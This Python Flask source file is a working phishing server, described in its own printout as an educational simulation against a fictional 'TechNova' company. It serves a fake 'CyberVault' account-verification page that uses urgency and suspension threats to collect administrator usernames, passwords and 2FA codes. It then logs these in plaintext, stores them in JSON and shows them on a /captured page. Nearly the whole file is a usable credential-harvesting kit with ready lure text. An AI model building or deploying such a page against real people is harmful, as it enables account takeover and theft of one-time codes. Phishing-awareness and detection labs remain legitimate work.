from flask import Flask, render_template_string, request, redirect
import logging
from datetime import datetime
import json

app = Flask(__name__)

# Configure logging to capture stolen credentials
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phishing_captured.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('PhishingAttack')

# Store captured credentials
captured_data = []

PHISHING_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberVault - Account Verification Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #f5f7fa;
            line-height: 1.6;
        }

        .header {
            background: #2c3e50;
            color: white;
            padding: 1.5rem 2rem;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .header .logo {
            font-size: 1.8rem;
            font-weight: bold;
            color: #3498db;
        }

        .container {
            max-width: 500px;
            margin: 3rem auto;
            padding: 2rem;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }

        .warning-banner {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 1rem;
            margin-bottom: 2rem;
            border-radius: 5px;
        }

        .warning-banner strong {
            color: #856404;
            display: block;
            margin-bottom: 0.5rem;
        }

        .warning-banner p {
            color: #856404;
            font-size: 0.9rem;
            margin: 0;
        }

        h1 {
            color: #2c3e50;
            margin-bottom: 1rem;
            font-size: 1.8rem;
        }

        .urgency-text {
            color: #e74c3c;
            font-weight: bold;
            margin-bottom: 1.5rem;
            padding: 0.8rem;
            background: #fee;
            border-radius: 5px;
            text-align: center;
        }

        .info-text {
            color: #555;
            margin-bottom: 2rem;
            line-height: 1.8;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: #333;
        }

        input {
            width: 100%;
            padding: 0.9rem;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #3498db;
        }

        .btn {
            width: 100%;
            padding: 1rem;
            background: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #2980b9;
        }

        .security-badge {
            text-align: center;
            margin-top: 1.5rem;
            padding-top: 1.5rem;
            border-top: 1px solid #eee;
        }

        .security-badge img {
            width: 80px;
            margin-bottom: 0.5rem;
        }

        .security-badge p {
            font-size: 0.85rem;
            color: #7f8c8d;
        }

        .footer {
            text-align: center;
            margin-top: 2rem;
            padding: 1.5rem;
            color: #7f8c8d;
            font-size: 0.85rem;
        }

        .expiry-countdown {
            background: #e74c3c;
            color: white;
            padding: 1rem;
            border-radius: 5px;
            text-align: center;
            margin-bottom: 1.5rem;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🔐 CyberVault</div>
    </div>

    <div class="container">
        <div class="warning-banner">
            <strong>⚠️ Action Required</strong>
            <p>Your account access will be suspended if credentials are not updated.</p>
        </div>

        <h1>Account Verification Required</h1>

        <div class="expiry-countdown">
            ⏰ Your credentials expire in 24 hours
        </div>

        <div class="info-text">
            <p>Dear TechNova Personnel,</p>
            <p style="margin-top: 1rem;">
                Our security team has detected that your CyberVault access credentials are approaching expiration. 
                To maintain uninterrupted access to company records and systems, please verify your account immediately.
            </p>
            <p style="margin-top: 1rem;">
                <strong>What happens if I don't update?</strong><br>
                Your access to TechNova financial records, client data, and administrative tools will be suspended within 24 hours.
            </p>
        </div>

        <form method="POST" action="/verify">
            <div class="form-group">
                <label>Administrator Username</label>
                <input type="text" name="username" placeholder="Enter your username" required autofocus>
            </div>

            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>

            <div class="form-group">
                <label>Two-Factor Authentication Code</label>
                <input type="text" name="twofa" placeholder="000000" maxlength="6" pattern="[0-9]{6}" required>
            </div>

            <button type="submit" class="btn">Verify & Update Credentials</button>
        </form>

        <div class="security-badge">
            <p>🔒 Secured Connection • TechNova IT Security</p>
            <p style="margin-top: 0.5rem;">If you did not request this update, contact support@technova.com</p>
        </div>
    </div>

    <div class="footer">
        <p>&copy; 2024 TechNova Consulting • CyberVault System</p>
        <p>This is an automated security notification. Do not reply to this page.</p>
    </div>
</body>
</html>
'''

SUCCESS_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Successful</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #f5f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            max-width: 500px;
            padding: 3rem;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            text-align: center;
        }

        .success-icon {
            font-size: 4rem;
            margin-bottom: 1rem;
        }

        h1 {
            color: #2ecc71;
            margin-bottom: 1rem;
        }

        p {
            color: #555;
            line-height: 1.8;
            margin-bottom: 1rem;
        }

        .redirect-text {
            margin-top: 2rem;
            padding: 1rem;
            background: #e7f3ff;
            border-radius: 5px;
            font-size: 0.9rem;
            color: #004085;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h1>Verification Successful!</h1>
        <p>Your credentials have been updated successfully.</p>
        <p>Your account access has been extended for another year.</p>
        <p style="margin-top: 2rem;">You may now close this page and continue with your work.</p>
        <div class="redirect-text">
            Redirecting to TechNova portal in 5 seconds...
        </div>
    </div>
    
    <script>
        setTimeout(function() {
            window.location.href = 'http://127.0.0.1:5001';
        }, 5000);
    </script>
</body>
</html>
'''

@app.route('/')
def phishing_page():
    """Display the phishing page"""
    logger.warning(f"🎣 Phishing page accessed from IP: {request.remote_addr}")
    return render_template_string(PHISHING_PAGE)

@app.route('/verify', methods=['POST'])
def capture_credentials():
    """Capture submitted credentials"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    twofa = request.form.get('twofa', '')
    
    # Log captured credentials
    timestamp = datetime.now().isoformat()
    victim_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    captured = {
        'timestamp': timestamp,
        'ip': victim_ip,
        'user_agent': user_agent,
        'username': username,
        'password': password,
        'twofa': twofa
    }
    
    captured_data.append(captured)
    
    # Log to file and console
    logger.critical(f"""
    ╔════════════════════════════════════════════════════════════════╗
    ║  🎣 PHISHING ATTACK - CREDENTIALS CAPTURED                     ║
    ╠════════════════════════════════════════════════════════════════╣
    ║  Timestamp:  {timestamp}                           
    ║  Victim IP:  {victim_ip}                                       
    ║  Username:   {username}                                        
    ║  Password:   {password}                                        
    ║  2FA Code:   {twofa}                                           
    ║  User Agent: {user_agent[:50]}...                              
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Save to JSON file for HIDS to monitor
    with open('phishing_captured.json', 'a') as f:
        json.dump(captured, f)
        f.write('\n')
    
    return render_template_string(SUCCESS_PAGE)

@app.route('/captured')
def view_captured():
    """View all captured credentials (for testing/demonstration)"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Captured Credentials</title>
        <style>
            body { font-family: monospace; padding: 2rem; background: #1a1a1a; color: #0f0; }
            h1 { color: #f00; }
            .entry { 
                background: #2a2a2a; 
                padding: 1rem; 
                margin: 1rem 0; 
                border-left: 4px solid #0f0;
                border-radius: 4px;
            }
            .field { margin: 0.5rem 0; }
            .label { color: #0ff; font-weight: bold; }
        </style>
    </head>
    <body>
        <h1>🎣 CAPTURED CREDENTIALS</h1>
        <p>Total victims: ''' + str(len(captured_data)) + '''</p>
        <hr>
    '''
    
    for entry in captured_data:
        html += f'''
        <div class="entry">
            <div class="field"><span class="label">Timestamp:</span> {entry['timestamp']}</div>
            <div class="field"><span class="label">IP Address:</span> {entry['ip']}</div>
            <div class="field"><span class="label">Username:</span> {entry['username']}</div>
            <div class="field"><span class="label">Password:</span> {entry['password']}</div>
            <div class="field"><span class="label">2FA Code:</span> {entry['twofa']}</div>
        </div>
        '''
    
    html += '</body></html>'
    return html

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🎣 PHISHING SERVER - ATTACKER MACHINE")
    print("="*70)
    print("\n⚠️  WARNING: This is a phishing simulation for educational purposes")
    print("   This server mimics the legitimate TechNova portal")
    print("\n📊 Monitoring:")
    print("   - Captured credentials: phishing_captured.log")
    print("   - JSON format data: phishing_captured.json")
    print("   - View captures at: http://127.0.0.1:8000/captured")
    print("\n🌐 Phishing page running at: http://127.0.0.1:8000")
    print("="*70 + "\n")
    
    app.run(debug=True, host='0.0.0.0', port=8000)